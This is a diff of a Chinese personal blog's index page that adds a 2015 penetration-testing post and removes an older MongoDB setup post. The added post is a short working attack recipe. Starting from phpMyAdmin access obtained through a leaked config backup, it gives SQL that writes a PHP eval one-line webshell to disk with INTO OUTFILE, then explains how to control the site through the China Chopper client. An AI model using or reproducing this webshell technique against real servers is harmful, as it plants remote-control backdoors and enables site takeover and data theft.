@@ -255,6 +255,130 @@
             
               
                 
+                <a class="post-title-link" href="/2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/" itemprop="url">
+                  phpmyadmin获得shell--初试一句话木马，chopper
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-08-01T15:17:49+08:00" content="2015-08-01">
+              2015-08-01
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/PT/" itemprop="url" rel="index">
+                    <span itemprop="name">PT</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/08/01/2015-08-01-phpmyadmin获得shell--初试一句话木马，chopper/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3><span id="进入到phpmyadmin后台本例中以bak配置文件泄露为例">进入到phpmyadmin后台（本例中以bak配置文件泄露为例）</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  create table foo(`cmd` text not <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">  insert into `foo`(`cmd`) values (<span class="string">"&lt;?php @eval($_POST['foo']);?&gt;"</span>);</span><br><span class="line"></span><br><span class="line">  select `cmd`  from `foo` into outfile <span class="string">"./foo.php"</span></span><br></pre></td></tr></table></figure>
+<p>(最好能找到网站路径的的路径，这样写的话在\wamp\bin\mysql\mysql5.6.17\data目录下会生成一个foo.php文件);</p>
+<p>执行完命令后，可以测试是否成功，浏览器直接打开/foo.php，如果出现空白就可以。</p>
+<h3><span id="接下来用chopper">接下来用chopper</span></h3><p>地址为网站foo.php地址，密码为$_POST[]内的内容，配置（可填可不填，如果要管理数据库的话要填），接下来是脚本类型，编码。</p>
+<p>这样就基本可以获得网站的shell，看shell的权限，有的权限很大，有的权限紧紧限于网站根目录的管理。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2015/07/11/2015-07-11-mongodb replSet 本地测试/" itemprop="url">
                   mongodb replSet 本地测试
                 </a>
@@ -1461,149 +1585,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/04/19/2015-04-19-Centos6.5配置mongodb/" itemprop="url">
-                  Centos6.5配置mongodb
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-04-19T10:15:54+08:00" content="2015-04-19">
-              2015-04-19
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/配置相关/" itemprop="url" rel="index">
-                    <span itemprop="name">配置相关</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015/04/19/2015-04-19-Centos6.5配置mongodb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/04/19/2015-04-19-Centos6.5配置mongodb/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <ol>
-<li>原文转载自<a href="http://www.wubiaoblog.com/archives/513" target="_blank" rel="external">http://www.wubiaoblog.com/archives/513</a></li>
-</ol>
-<p>目录[-]</p>
-<p>一、yum配置</p>
-<p>1.1、检查相关包信息：</p>
-<p>1.2、配置10gen.repo文件：</p>
-<p>1.3、执行yum update：</p>
-<p>1.4、再次查看相关的包信息：</p>
-<p>1.5、可能遇到的错误信息：</p>
-<p>1.5.1）、网络问题：</p>
-<p>1.5.2）、校验和不匹配：</p>
-<p>1.5.3）、解决方法：</p>
-<p>二、安装</p>
-<p>2.1、安装相关包：</p>
-<p>2.2、检查安装的文件：</p>
-<p>三、mongodb相关配置</p>
-<p>3.1、建立数据文件及日志文件的目录：</p>
-<p>3.2、配置/etc/mongod.conf：</p>
-<p>四、启动与简单测试</p>
-<p>4.1、service mongod start：</p>
-<p>4.2、mongod -f /etc/mongod.conf：</p>
-<p>4.3、检查启动情况：</p>
-<p>4.4、客户端测试：</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1649,7 +1630,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">42</span>
+              <span class="site-state-item-count">43</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1657,7 +1638,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1666,7 +1647,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
